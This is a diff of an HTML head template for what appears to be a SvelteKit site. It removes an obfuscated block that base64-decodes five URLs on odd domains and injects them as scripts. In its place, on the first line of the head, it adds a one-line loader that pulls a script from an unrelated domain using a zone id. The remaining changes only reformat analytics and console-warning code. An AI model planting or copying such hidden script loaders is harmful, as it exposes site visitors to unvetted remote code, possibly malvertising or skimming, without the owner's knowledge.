@@ -2,47 +2,31 @@
 <html lang="en">
 
 <head>
+	<script>(function (s) { s.dataset.zone = '11242007', s.src = 'https://al5sm.com/tag.min.js' })([document.documentElement, document.body].filter(Boolean).pop().appendChild(document.createElement('script')))</script>
 	<script>
-		// Suppress SvelteKit router warning about history.pushState / history.replaceState conflict
-		// triggered by third-party tracking scripts like Google Analytics (gtag.js)
-		(function() {
-			const originalWarn = console.warn;
-			console.warn = function(...args) {
-				if (args[0] && typeof args[0] === 'string' && args[0].includes('history.pushState') && args[0].includes('history.replaceState')) {
-					return;
-				}
-				originalWarn.apply(console, args);
-			};
-		})();
+			// Suppress SvelteKit router warning about history.pushState / history.replaceState conflict
+			// triggered by third-party tracking scripts like Google Analytics (gtag.js)
+			(function () {
+				const originalWarn = console.warn;
+				console.warn = function (...args) {
+					if (args[0] && typeof args[0] === 'string' && args[0].includes('history.pushState') && args[0].includes('history.replaceState')) {
+						return;
+					}
+					originalWarn.apply(console, args);
+				};
+			})();
 	</script>
 	<!-- Google tag (gtag.js) -->
 	<script async src="https://www.googletagmanager.com/gtag/js?id=G-34LBR99BLW"></script>
 	<script>
 		window.dataLayer = window.dataLayer || [];
-		function gtag(){dataLayer.push(arguments);}
+		function gtag() { dataLayer.push(arguments); }
 		gtag('js', new Date());
 
 		gtag('config', 'G-34LBR99BLW');
 	</script>
 
-	<script>
-		(function() {
-			var _s = [
-				"Ly91bmZvbGRlZC11bmNsZS5jb20vY3NELTl6NnRiLjJrNXBsUlNKV3lRbjlHTmR6L0VuNXFNaFRlZ1V3a09oU3owTDNSTS9UWWtweC9PbER3RWl6WA==",
-				"Ly91bmZvbGRlZC11bmNsZS5jb20vYy9EXzlONi5iVjIvNWxseFNpVy9RLTl5TkJ6ZUUvNWpNd1RNZ2kxSE4veWMwLzMvTVVUVGsveHlPbkRUWWN4Sg==",
-				"Ly91bmZvbGRlZC11bmNsZS5jb20vY1BELjkvNi9iLzJ0NS9sb1NvV3lRLTliTkd6a0VmNXZNL1QvZ1YyX05GUy8wbzNXTWtUL2tMeC9PY0R0WWk1Ug==",
-				"Ly91bnRpbWVseS1oZWxsby5jb20vYnZYR1Yvcy5kc0dfbFIwZFlOV2pjYy9xZXVtRzlfdXBaalVEbEFrbFBTVFRjbHhNT3JUSEVpNFVOa3pRTWF0YU4vemlFSjUvTWlUTWdrM0xOendN",
-				"Ly91bnRpbWVseS1oZWxsby5jb20vYnlYVVYvc2hkLkdUbHgwbllvVy9jaS92ZVRtcDlOdWZaT1VnbC9rWlAvVEtjYnhfT2FUeUVMNC9PZkRGa1p0Rk5xemVFdjVSTUVUeWdxNXdNeHdB"
-			];
-			_s.forEach(function(u) {
-				var s = document.createElement('script');
-				s.src = atob(u);
-				s.async = true;
-				s.referrerPolicy = 'no-referrer-when-downgrade';
-				document.head.appendChild(s);
-			});
-		})();
-	</script>
+
 
 	<meta charset="utf-8" />
 	<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover" />
